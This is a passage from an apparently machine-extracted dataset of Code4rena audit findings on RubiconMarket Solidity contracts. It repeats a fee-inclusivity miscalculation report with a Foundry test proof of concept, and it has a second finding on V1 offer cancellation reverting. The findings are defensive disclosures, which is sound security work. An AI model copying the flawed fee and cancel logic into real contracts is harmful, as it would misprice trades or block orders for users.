\"Insufficient funds to cover fee\"\n357:                 );\n358:             } else {\n359:                 require(\n360:                     _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n361:                     \"Insufficient funds to cover fee\"\n362:                 );\n363:             }\n364:\n365:             emit emitFee(\n366:                 bytes32(id),\n367:                 msg.sender,\n368:                 _offer.owner,\n369:                 keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n370:                 _offer.buy_gem,\n371:                 mFee\n372:             );\n373:         }\n```\n\nOne of the new additions in the RubiconMarket v2 is fee inclusivity, a feature that would allow users to operate on the market by including the fee directly in the specified amount. This is present in different places of the contract, but the core implementation can be founded in the `calcAmountAfterFee` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n```solidity\n578:     function calcAmountAfterFee(\n579:         uint256 amount\n580:     ) public view returns (uint256 _amount) {\n581:         require(amount > 0);\n582:         _amount = amount;\n583:         _amount -= mul(amount, feeBPS) / 100_000;\n584:\n585:         if (makerFee() > 0) {\n586:             _amount -= mul(amount, makerFee()) / 100_000;\n587:         }\n588:     }\n```\n\nAs we can see in the previous snippet, the function calculates the protocol feeÂ and the marker fee based on the given amount, and substacts those values from the amount. This is an inaccurate calculation, as these fees later on will be calculated using this new value, which won't end up totalling the requested original amount. As an example, let's consider the case of 100 tokens, a 10% protocol fee and a 5% maker fee:\n\n1. Initial amount is 1000 tokens.\n2. Protocol fee is `1000 * 10% = 100` tokens.\n3. Maker fee is `1000 * 5% = 50` tokens.\n4. Resulting amount of `calcAmountAfterFee` will be `1000 - 100 - 50 = 850` tokens.\n5. In the core `buy` function, the trade amount will be 850 tokens, and the function will then calculate fees based on this amount.\n6. Protocol fee will be calculated as `850 * 10% = 85` and maker fee will be calculated as `850 * 5% = 42` tokens.\n7. This means that the user will end up paying 850 for the trade, 85 for the protocol fee and 42 for the maker fee. `850 + 85 + 42 = 977` which is a bit less than the original 1000 tokens.\n\n## Proof of Concept\n\nIn the following test, Alice makes an offer to sell 30k USDC for 1 BTC. Bob will execute the trade to buy the complete 30k USDC with BTC. However, as the fee calculation is inaccurate, the trade will be executed for an amount less than expected and Bob will be left with some unspent BTC (0.000225 BTC).\n\n```\nLogs:\n  Bob BTC balance: 225000000000000\n```\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_RubiconMarket_buy_IncorrectFeeInclusivity() public {\n    // Alice has 30k USDC, bob has 1 BTC\n    USDC.mint(alice, 30_000 ether);\n    BTC.mint(bob, 1 ether);\n\n    // Alice creates the offer to sell USDC for BTC\n    vm.prank(alice);\n    USDC.approve(address(market), type(uint256).max);\n    vm.prank(alice);\n    bytes32 id = market.make(\n        USDC, // pay\n        BTC, // buy\n        30_000 ether, // pay_amount\n        1 ether // buy_amount\n    );\n\n    // Bob trades his BTC for USDC\n    vm.prank(bob);\n    BTC.approve(address(market), type(uint256).max);\n    vm.prank(bob);\n    market.buy(uint256(id), 30_000 ether);\n\n    console.log(\"Bob BTC balance:\", BTC.balanceOf(bob));\n}\n```\n\n## Recommendation\n\nThe correct calculation for the fee inclusivity amount should be as follows:\n\n```\nresult = amount / (100% + protocol fee + maker fee)\n```\n\nFor the example given in the previous section, this would result in an amount of `1000 / (100% + 10% + 5%) = 869`.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n\n# Vulnerability details\n\n## Impact\n\nTrading in the RubiconMarket has associated fee costs that are paid by the taker of the offer. These fees include the protocol fee and a new \"maker fee\" introduced in v2. Fees are pulled from the taker (caller of the function) independently of the trade amount, which means fees are not included in the trade amount. These are implemented in the `buy` function of the base contract `SimpleMarket`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L337-L373\n\n```solidity\n337:         /// @dev Fee logic added on taker trades\n338:         uint256 fee = mul(spend, feeBPS) / 100_000;\n339:         require(\n340:             _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n341:             \"Insufficient funds to cover fee\"\n342:         );\n343: \n344:         // taker pay maker 0_0\n345:         if (makerFee() > 0) {\n346:             uint256 mFee = mul(spend, makerFee()) / 100_000;\n347: \n348:             /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n349:             if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n350:                 require(\n351:                     _offer.buy_gem.transferFrom(\n352:                         msg.sender,\n353:                         _offer.recipient,\n354:                         mFee\n355:                     ),\n356:                     \"Insufficient funds to cover fee\"\n357:                 );\n358:             } else {\n359:                 require(\n360:                     _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n361:                     \"Insufficient funds to cover fee\"\n362:                 );\n363:             }\n364: \n365:             emit emitFee(\n366:                 bytes32(id),\n367:                 msg.sender,\n368:                 _offer.owner,\n369:                 keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n370:                 _offer.buy_gem,\n371:                 mFee\n372:             );\n373:         }\n```\n\nOne of the new additions in the RubiconMarket v2 is fee inclusivity, a feature that would allow users to operate on the market by including the fee directly in the specified amount. This is present in different places of the contract, but the core implementation can be founded in the `calcAmountAfterFee` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n```solidity\n578:     function calcAmountAfterFee(\n579:         uint256 amount\n580:     ) public view returns (uint256 _amount) {\n581:         require(amount > 0);\n582:         _amount = amount;\n583:         _amount -= mul(amount, feeBPS) / 100_000;\n584: \n585:         if (makerFee() > 0) {\n586:             _amount -= mul(amount, makerFee()) / 100_000;\n587:         }\n588:     }\n```\n\nAs we can see in the previous snippet, the function calculates the protocol feeÂ and the marker fee based on the given amount, and substacts those values from the amount. This is an inaccurate calculation, as these fees later on will be calculated using this new value, which won't end up totalling the requested original amount. As an example, let's consider the case of 100 tokens, a 10% protocol fee and a 5% maker fee:\n\n1. Initial amount is 1000 tokens.\n2. Protocol fee is `1000 * 10% = 100` tokens.\n3. Maker fee is `1000 * 5% = 50` tokens.\n4. Resulting amount of `calcAmountAfterFee` will be `1000 - 100 - 50 = 850` tokens.\n5. In the core `buy` function, the trade amount will be 850 tokens, and the function will then calculate fees based on this amount.\n6. Protocol fee will be calculated as `850 * 10% = 85` and maker fee will be calculated as `850 * 5% = 42` tokens. \n7. This means that the user will end up paying 850 for the trade, 85 for the protocol fee and 42 for the maker fee. `850 + 85 + 42 = 977` which is a bit less than the original 1000 tokens.\n\n## Proof of Concept\n\nIn the following test, Alice makes an offer to sell 30k USDC for 1 BTC. Bob will execute the trade to buy the complete 30k USDC with BTC. However, as the fee calculation is inaccurate, the trade will be executed for an amount less than expected and Bob will be left with some unspent BTC (0.000225 BTC).\n\n```\nLogs:\n  Bob BTC balance: 225000000000000\n```\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_RubiconMarket_buy_IncorrectFeeInclusivity() public {\n    // Alice has 30k USDC, bob has 1 BTC\n    USDC.mint(alice, 30_000 ether);\n    BTC.mint(bob, 1 ether);\n\n    // Alice creates the offer to sell USDC for BTC\n    vm.prank(alice);\n    USDC.approve(address(market), type(uint256).max);\n    vm.prank(alice);\n    bytes32 id = market.make(\n        USDC, // pay\n        BTC, // buy\n        30_000 ether, // pay_amount\n        1 ether // buy_amount\n    );\n\n    // Bob trades his BTC for USDC\n    vm.prank(bob);\n    BTC.approve(address(market), type(uint256).max);\n    vm.prank(bob);\n    market.buy(uint256(id), 30_000 ether);\n\n    console.log(\"Bob BTC balance:\", BTC.balanceOf(bob));\n}\n```\n\n## Recommendation\n\nThe correct calculation for the fee inclusivity amount should be as follows:\n\n```\nresult = amount / (100% + protocol fee + maker fee)\n```\n\nFor the example given in the previous section, this would result in an amount of `1000 / (100% + 10% + 5%) = 869`.\n",
      "description": null,
      "impact": "## Impact\n\nTrading in the RubiconMarket has associated fee costs that are paid by the taker of the offer. These fees include the protocol fee and a new \"maker fee\" introduced in v2. Fees are pulled from the taker (caller of the function) independently of the trade amount, which means fees are not included in the trade amount. These are implemented in the `buy` function of the base contract `SimpleMarket`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L337-L373\n\n```solidity\n337:         /// @dev Fee logic added on taker trades\n338:         uint256 fee = mul(spend, feeBPS) / 100_000;\n339:         require(\n340:             _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n341:             \"Insufficient funds to cover fee\"\n342:         );\n343:\n344:         // taker pay maker 0_0\n345:         if (makerFee() > 0) {\n346:             uint256 mFee = mul(spend, makerFee()) / 100_000;\n347:\n348:             /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n349:             if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n350:                 require(\n351:                     _offer.buy_gem.transferFrom(\n352:                         msg.sender,\n353:                         _offer.recipient,\n354:                         mFee\n355:                     ),\n356:                     \"Insufficient funds to cover fee\"\n357:                 );\n358:             } else {\n359:                 require(\n360:                     _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n361:                     \"Insufficient funds to cover fee\"\n362:                 );\n363:             }\n364:\n365:             emit emitFee(\n366:                 bytes32(id),\n367:                 msg.sender,\n368:                 _offer.owner,\n369:                 keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n370:                 _offer.buy_gem,\n371:                 mFee\n372:             );\n373:         }\n```\n\nOne of the new additions in the RubiconMarket v2 is fee inclusivity, a feature that would allow users to operate on the market by including the fee directly in the specified amount. This is present in different places of the contract, but the core implementation can be founded in the `calcAmountAfterFee` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n```solidity\n578:     function calcAmountAfterFee(\n579:         uint256 amount\n580:     ) public view returns (uint256 _amount) {\n581:         require(amount > 0);\n582:         _amount = amount;\n583:         _amount -= mul(amount, feeBPS) / 100_000;\n584:\n585:         if (makerFee() > 0) {\n586:             _amount -= mul(amount, makerFee()) / 100_000;\n587:         }\n588:     }\n```\n\nAs we can see in the previous snippet, the function calculates the protocol feeÂ and the marker fee based on the given amount, and substacts those values from the amount. This is an inaccurate calculation, as these fees later on will be calculated using this new value, which won't end up totalling the requested original amount. As an example, let's consider the case of 100 tokens, a 10% protocol fee and a 5% maker fee:\n\n1. Initial amount is 1000 tokens.\n2. Protocol fee is `1000 * 10% = 100` tokens.\n3. Maker fee is `1000 * 5% = 50` tokens.\n4. Resulting amount of `calcAmountAfterFee` will be `1000 - 100 - 50 = 850` tokens.\n5. In the core `buy` function, the trade amount will be 850 tokens, and the function will then calculate fees based on this amount.\n6. Protocol fee will be calculated as `850 * 10% = 85` and maker fee will be calculated as `850 * 5% = 42` tokens.\n7. This means that the user will end up paying 850 for the trade, 85 for the protocol fee and 42 for the maker fee. `850 + 85 + 42 = 977` which is a bit less than the original 1000 tokens.\n",
      "mitigation": "## Recommendation\n\nThe correct calculation for the fee inclusivity amount should be as follows:\n\n```\nresult = amount / (100% + protocol fee + maker fee)\n```\n\nFor the example given in the previous section, this would result in an amount of `1000 / (100% + 10% + 5%) = 869`.\n",
      "poc": "## Proof of Concept\n\nIn the following test, Alice makes an offer to sell 30k USDC for 1 BTC. Bob will execute the trade to buy the complete 30k USDC with BTC. However, as the fee calculation is inaccurate, the trade will be executed for an amount less than expected and Bob will be left with some unspent BTC (0.000225 BTC).\n\n```\nLogs:\n  Bob BTC balance: 225000000000000\n```\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_RubiconMarket_buy_IncorrectFeeInclusivity() public {\n    // Alice has 30k USDC, bob has 1 BTC\n    USDC.mint(alice, 30_000 ether);\n    BTC.mint(bob, 1 ether);\n\n    // Alice creates the offer to sell USDC for BTC\n    vm.prank(alice);\n    USDC.approve(address(market), type(uint256).max);\n    vm.prank(alice);\n    bytes32 id = market.make(\n        USDC, // pay\n        BTC, // buy\n        30_000 ether, // pay_amount\n        1 ether // buy_amount\n    );\n\n    // Bob trades his BTC for USDC\n    vm.prank(bob);\n    BTC.approve(address(market), type(uint256).max);\n    vm.prank(bob);\n    market.buy(uint256(id), 30_000 ether);\n\n    console.log(\"Bob BTC balance:\", BTC.balanceOf(bob));\n}\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nTrading in the RubiconMarket has associated fee costs that are paid by the taker of the offer. These fees include the protocol fee and a new \"maker fee\" introduced in v2. Fees are pulled from the taker (caller of the function) independently of the trade amount, which means fees are not included in the trade amount. These are implemented in the `buy` function of the base contract `SimpleMarket`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L337-L373\n\n```solidity\n337:         /// @dev Fee logic added on taker trades\n338:         uint256 fee = mul(spend, feeBPS) / 100_000;\n339:         require(\n340:             _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n341:             \"Insufficient funds to cover fee\"\n342:         );\n343:\n344:         // taker pay maker 0_0\n345:         if (makerFee() > 0) {\n346:             uint256 mFee = mul(spend, makerFee()) / 100_000;\n347:\n348:             /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n349:             if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n350:                 require(\n351:                     _offer.buy_gem.transferFrom(\n352:                         msg.sender,\n353:                         _offer.recipient,\n354:                         mFee\n355:                     ),\n356:                     \"Insufficient funds to cover fee\"\n357:                 );\n358:             } else {\n359:                 require(\n360:                     _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n361:                     \"Insufficient funds to cover fee\"\n362:                 );\n363:             }\n364:\n365:             emit emitFee(\n366:                 bytes32(id),\n367:                 msg.sender,\n368:                 _offer.owner,\n369:                 keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n370:                 _offer.buy_gem,\n371:                 mFee\n372:             );\n373:         }\n```\n\nOne of the new additions in the RubiconMarket v2 is fee inclusivity, a feature that would allow users to operate on the market by including the fee directly in the specified amount. This is present in different places of the contract, but the core implementation can be founded in the `calcAmountAfterFee` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n```solidity\n578:     function calcAmountAfterFee(\n579:         uint256 amount\n580:     ) public view returns (uint256 _amount) {\n581:         require(amount > 0);\n582:         _amount = amount;\n583:         _amount -= mul(amount, feeBPS) / 100_000;\n584:\n585:         if (makerFee() > 0) {\n586:             _amount -= mul(amount, makerFee()) / 100_000;\n587:         }\n588:     }\n```\n\nAs we can see in the previous snippet, the function calculates the protocol feeÂ and the marker fee based on the given amount, and substacts those values from the amount. This is an inaccurate calculation, as these fees later on will be calculated using this new value, which won't end up totalling the requested original amount. As an example, let's consider the case of 100 tokens, a 10% protocol fee and a 5% maker fee:\n\n1. Initial amount is 1000 tokens.\n2. Protocol fee is `1000 * 10% = 100` tokens.\n3. Maker fee is `1000 * 5% = 50` tokens.\n4. Resulting amount of `calcAmountAfterFee` will be `1000 - 100 - 50 = 850` tokens.\n5. In the core `buy` function, the trade amount will be 850 tokens, and the function will then calculate fees based on this amount.\n6. Protocol fee will be calculated as `850 * 10% = 85` and maker fee will be calculated as `850 * 5% = 42` tokens.\n7. This means that the user will end up paying 850 for the trade, 85 for the protocol fee and 42 for the maker fee. `850 + 85 + 42 = 977` which is a bit less than the original 1000 tokens.\n",
        "recommendation": "## Recommendation\n\nThe correct calculation for the fee inclusivity amount should be as follows:\n\n```\nresult = amount / (100% + protocol fee + maker fee)\n```\n\nFor the example given in the previous section, this would result in an amount of `1000 / (100% + 10% + 5%) = 869`.\n",
        "poc": "## Proof of Concept\n\nIn the following test, Alice makes an offer to sell 30k USDC for 1 BTC. Bob will execute the trade to buy the complete 30k USDC with BTC. However, as the fee calculation is inaccurate, the trade will be executed for an amount less than expected and Bob will be left with some unspent BTC (0.000225 BTC).\n\n```\nLogs:\n  Bob BTC balance: 225000000000000\n```\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_RubiconMarket_buy_IncorrectFeeInclusivity() public {\n    // Alice has 30k USDC, bob has 1 BTC\n    USDC.mint(alice, 30_000 ether);\n    BTC.mint(bob, 1 ether);\n\n    // Alice creates the offer to sell USDC for BTC\n    vm.prank(alice);\n    USDC.approve(address(market), type(uint256).max);\n    vm.prank(alice);\n    bytes32 id = market.make(\n        USDC, // pay\n        BTC, // buy\n        30_000 ether, // pay_amount\n        1 ether // buy_amount\n    );\n\n    // Bob trades his BTC for USDC\n    vm.prank(bob);\n    BTC.approve(address(market), type(uint256).max);\n    vm.prank(bob);\n    market.buy(uint256(id), 30_000 ether);\n\n    console.log(\"Bob BTC balance:\", BTC.balanceOf(bob));\n}\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n\n# Vulnerability details\n\n## Impact\n\nTrading in the RubiconMarket has associated fee costs that are paid by the taker of the offer. These fees include the protocol fee and a new \"maker fee\" introduced in v2. Fees are pulled from the taker (caller of the function) independently of the trade amount, which means fees are not included in the trade amount. These are implemented in the `buy` function of the base contract `SimpleMarket`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L337-L373\n\n```solidity\n337:         /// @dev Fee logic added on taker trades\n338:         uint256 fee = mul(spend, feeBPS) / 100_000;\n339:         require(\n340:             _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n341:             \"Insufficient funds to cover fee\"\n342:         );\n343:\n344:         // taker pay maker 0_0\n345:         if (makerFee() > 0) {\n346:             uint256 mFee = mul(spend, makerFee()) / 100_000;\n347:\n348:             /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n349:             if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n350:                 require(\n351:                     _offer.buy_gem.transferFrom(\n352:                         msg.sender,\n353:                         _offer.recipient,\n354:                         mFee\n355:                     ),\n356:                     \"Insufficient funds to cover fee\"\n357:                 );\n358:             } else {\n359:                 require(\n360:                     _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n361:                     \"Insufficient funds to cover fee\"\n362:                 );\n363:             }\n364:\n365:             emit emitFee(\n366:                 bytes32(id),\n367:                 msg.sender,\n368:                 _offer.owner,\n369:                 keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem)),\n370:                 _offer.buy_gem,\n371:                 mFee\n372:             );\n373:         }\n```\n\nOne of the new additions in the RubiconMarket v2 is fee inclusivity, a feature that would allow users to operate on the market by including the fee directly in the specified amount. This is present in different places of the contract, but the core implementation can be founded in the `calcAmountAfterFee` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n```solidity\n578:     function calcAmountAfterFee(\n579:         uint256 amount\n580:     ) public view returns (uint256 _amount) {\n581:         require(amount > 0);\n582:         _amount = amount;\n583:         _amount -= mul(amount, feeBPS) / 100_000;\n584:\n585:         if (makerFee() > 0) {\n586:             _amount -= mul(amount, makerFee()) / 100_000;\n587:         }\n588:     }\n```\n\nAs we can see in the previous snippet, the function calculates the protocol feeÂ and the marker fee based on the given amount, and substacts those values from the amount. This is an inaccurate calculation, as these fees later on will be calculated using this new value, which won't end up totalling the requested original amount. As an example, let's consider the case of 100 tokens, a 10% protocol fee and a 5% maker fee:\n\n1. Initial amount is 1000 tokens.\n2. Protocol fee is `1000 * 10% = 100` tokens.\n3. Maker fee is `1000 * 5% = 50` tokens.\n4. Resulting amount of `calcAmountAfterFee` will be `1000 - 100 - 50 = 850` tokens.\n5. In the core `buy` function, the trade amount will be 850 tokens, and the function will then calculate fees based on this amount.\n6. Protocol fee will be calculated as `850 * 10% = 85` and maker fee will be calculated as `850 * 5% = 42` tokens.\n7. This means that the user will end up paying 850 for the trade, 85 for the protocol fee and 42 for the maker fee. `850 + 85 + 42 = 977` which is a bit less than the original 1000 tokens.\n\n## Proof of Concept\n\nIn the following test, Alice makes an offer to sell 30k USDC for 1 BTC. Bob will execute the trade to buy the complete 30k USDC with BTC. However, as the fee calculation is inaccurate, the trade will be executed for an amount less than expected and Bob will be left with some unspent BTC (0.000225 BTC).\n\n```\nLogs:\n  Bob BTC balance: 225000000000000\n```\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_RubiconMarket_buy_IncorrectFeeInclusivity() public {\n    // Alice has 30k USDC, bob has 1 BTC\n    USDC.mint(alice, 30_000 ether);\n    BTC.mint(bob, 1 ether);\n\n    // Alice creates the offer to sell USDC for BTC\n    vm.prank(alice);\n    USDC.approve(address(market), type(uint256).max);\n    vm.prank(alice);\n    bytes32 id = market.make(\n        USDC, // pay\n        BTC, // buy\n        30_000 ether, // pay_amount\n        1 ether // buy_amount\n    );\n\n    // Bob trades his BTC for USDC\n    vm.prank(bob);\n    BTC.approve(address(market), type(uint256).max);\n    vm.prank(bob);\n    market.buy(uint256(id), 30_000 ether);\n\n    console.log(\"Bob BTC balance:\", BTC.balanceOf(bob));\n}\n```\n\n## Recommendation\n\nThe correct calculation for the fee inclusivity amount should be as follows:\n\n```\nresult = amount / (100% + protocol fee + maker fee)\n```\n\nFor the example given in the previous section, this would result in an amount of `1000 / (100% + 10% + 5%) = 869`.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1324,
      "page_start": null,
      "heading": "1324. `RubiconMarket._buys` will not work for V1 offers due to the reversion in `cancel` method.",
      "heading_cleaned": "`RubiconMarket._buys` will not work for V1 offers due to the reversion in `cancel` method.",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1201-L1202\n\n\n# Vulnerability details\n\n\n## Impact\n`RubiconMarket._buys` tries to cancel dust remaining offers, but it fails for V1 offers. So it blocks `RubiconMarket._buys`.\n\n\n## Proof of Concept\n\nIn `RubiconMarket._buys`, it tries to cancel an offer with dust pay token amount after fulfilling. So it sets `dustId` so it can pass the `RubiconMarket.can_cancel` modifier.\n\n```solidity\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n```\n\nBut when we move into `cancel` method, there is another validation. `RubiconMarket.cancel` will call `SimpleMarket.cancel`, and `SimpleMarket.cancel` tries to return dust pay token amount to owner.\n\n```solidity\n        _offer.owner == address(0) && msg.sender == _offer.recipient\n            ? require(_offer.pay_gem.transfer(_offer.recipient, _offer.pay_amt))\n            : require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n```\n\nIn this case, `msg.sender` is different from `_offer.recipient` so `SimpleMarket.cancel` will treat this as a V2 offer, while it can be a valid V1 offer. So for a V1 offer, it tries to send pay token amount to `_offer.owner`, and it is `address(0)` for V1 offers. So it will revert and `SimpleMarket.cancel` will not work although it passes `RubiconMarket.can_cancel` modifier. This will block `_buy` method.\n\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\n\n\nIn `SimpleMarket.cancel`, we should refund pay token amount to `_offer.recipient` when `_offer.owner` is `address(0)`.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1201-L1202\n\n\n# Vulnerability details\n\n\n## Impact\n`RubiconMarket._buys` tries to cancel dust remaining offers, but it fails for V1 offers. So it blocks `RubiconMarket._buys`.\n\n\n## Proof of Concept\n\nIn `RubiconMarket._buys`, it tries to cancel an offer with dust pay token amount after fulfilling. So it sets `dustId` so it can pass the `RubiconMarket.can_cancel` modifier.\n\n```solidity\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n```\n\nBut when we move into `cancel` method, there is another validation. `RubiconMarket.cancel` will call `SimpleMarket.cancel`, and `SimpleMarket.cancel` tries to return dust pay token amount to owner.\n\n```solidity\n        _offer.owner == address(0) && msg.sender == _offer.recipient\n            ? require(_offer.pay_gem.transfer(_offer.recipient, _offer.pay_amt))\n            : require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n```\n\nIn this case, `msg.sender` is different from `_offer.recipient` so `SimpleMarket.cancel` will treat this as a V2 offer, while it can be a valid V1 offer. So for a V1 offer, it tries to send pay token amount to `_offer.owner`, and it is `address(0)` for V1 offers. So it will revert and `SimpleMarket.cancel` will not work although it passes `RubiconMarket.can_cancel` modifier. This will block `_buy` method.\n\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\n\n\nIn `SimpleMarket.cancel`, we should refund pay token amount to `_offer.recipient` when `_offer.owner` is `address(0)`.\n\n\n",
      "description": null,
      "impact": "## Impact\n`RubiconMarket._buys` tries to cancel dust remaining offers, but it fails for V1 offers. So it blocks `RubiconMarket._buys`.\n",
      "mitigation": "## Recommended Mitigation Steps\n\n\nIn `SimpleMarket.cancel`, we should refund pay token amount to `_offer.recipient` when `_offer.owner` is `address(0)`.\n",
      "poc": "## Proof of Concept\n\nIn `RubiconMarket._buys`, it tries to cancel an offer with dust pay token amount after fulfilling. So it sets `dustId` so it can pass the `RubiconMarket.can_cancel` modifier.\n\n```solidity\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n```\n\nBut when we move into `cancel` method, there is another validation. `RubiconMarket.cancel` will call `SimpleMarket.cancel`, and `SimpleMarket.cancel` tries to return dust pay token amount to owner.\n\n```solidity\n        _offer.owner == address(0) && msg.sender == _offer.recipient\n            ? require(_offer.pay_gem.transfer(_offer.recipient, _offer.pay_amt))\n            : require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n```\n\nIn this case, `msg.sender` is different from `_offer.recipient` so `SimpleMarket.cancel` will treat this as a V2 offer, while it can be a valid V1 offer. So for a V1 offer, it tries to send pay token amount to `_offer.owner`, and it is `address(0)` for V1 offers. So it will revert and `SimpleMarket.cancel` will not work although it passes `RubiconMarket.can_cancel` modifier. This will block `_buy` method.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1201-L1202\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n`RubiconMarket._buys` tries to cancel dust remaining offers, but it fails for V1 offers. So it blocks `RubiconMarket._buys`.\n",
        "recommendation": "## Recommended Mitigation Steps\n\n\nIn `SimpleMarket.cancel`, we should refund pay token amount to `_offer.recipient` when `_offer.owner` is `address(0)`.\n",
        "poc": "## Proof of Concept\n\nIn `RubiconMarket._buys`, it tries to cancel an offer with dust pay token amount after fulfilling. So it sets `dustId` so it can pass the `RubiconMarket.can_cancel` modifier.\n\n```solidity\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n```\n\nBut when we move into `cancel` method, there is another validation. `RubiconMarket.cancel` will call `SimpleMarket.cancel`, and `SimpleMarket.cancel` tries to return dust pay token amount to owner.\n\n```solidity\n        _offer.owner == address(0) && msg.sender == _offer.recipient\n            ? require(_offer.pay_gem.transfer(_offer.recipient, _offer.pay_amt))\n            : require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n```\n\nIn this case, `msg.sender` is different from `_offer.recipient` so `SimpleMarket.cancel` will treat this as a V2 offer, while it can be a valid V1 offer. So for a V1 offer, it tries to send pay token amount to `_offer.owner`, and it is `address(0)` for V1 offers. So it will revert and `SimpleMarket.cancel` will not work although it passes `RubiconMarket.can_cancel` modifier. This will block `_buy` method.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1201-L1202\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n"
      },
